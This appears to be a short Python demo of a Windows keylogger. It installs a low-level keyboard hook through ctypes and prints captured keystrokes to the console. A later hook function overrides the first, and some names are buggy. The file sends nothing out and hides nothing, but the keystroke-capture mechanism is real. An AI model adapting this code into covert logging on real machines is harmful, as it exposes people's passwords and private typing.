import win32con
import ctypes
from ctypes import *
from ctypes.wintypes import DWORD

user32 = windll.user32
kernel32 = windll.kernel32

class KBDLLHOOKSTRUCT(Structure): _fields_=[
    ('vkCode',DWORD),
    ('scanCode',DWORD),
    ('flags',DWORD),
    ('time',DWORD),
    ('dwExtraInfo',DWORD)]

HOOKPROC = WINFUNCTYPE(HRESULT, c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)

class KeyLogger:
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None
    def installHookProc(self,pointer):
        self.hooked = self.lUser32.SetWindowsHookExA(
            win32con.WH_KEYBOARD_LL,
            pointer,
            kernel32.GetModuleHandleW(None),
            0
        )
        if not self.hooked:
            return False
        return True
    def uninstalHookProc(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None


def hookProc(nCode, wParam, lParam):
    if user32.GetKeyState(win32con.VK_CONTROL) & 0x8000:
        print("\nCtrl pressed, call uninstallHook()")
        KeyLogger.uninstalHookProc()
        return 0
    if nCode == win32con.HC_ACTION and wParam == win32con.WM_KEYDOWN:
        kb = KBDLLHOOKSTRUCT.from_address(lParam)
        user32.GetKeyState(win32con.VK_SHIFT)
        user32.GetKeyState(win32con.VK_MENU)
        state = (ctypes.c_char * 256)()
        user32.GetKeyboardState(byref(state))
        str = create_unicode_buffer(8)
        n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, str, 8 - 1, 0)
        if n > 0:
            if kb.vkCode == win32con.VK_RETURN:
                print()
            else:
                print(ctypes.wstring_at(str), end = "", flush = True)
    return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)
    
def hookProc(nCode, wParam, lParam):
    if nCode == win32con.HC_ACTION and wParam == win32con.WM_KEYDOWN:
        kb = KBDLLHOOKSTRUCT.from_address(lParam)
        print(f"Key pressed: vkCode={kb.vkCode}")  # Print the virtual key code of the pressed key
        
        if kb.vkCode == win32con.VK_SPACE:
            print("got space")
            return 1  # Prevent further processing of the space key

    # Call the next hook in the chain
    return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)



KeyLogger = KeyLogger()
pointer = HOOKPROC(hookProc)
KeyLogger.installHookProc(pointer)
print("Hook installed")
msg = ctypes.wintypes.MSG()
user32.GetMessageA(byref(msg), 0, 0, 0) #wait for messages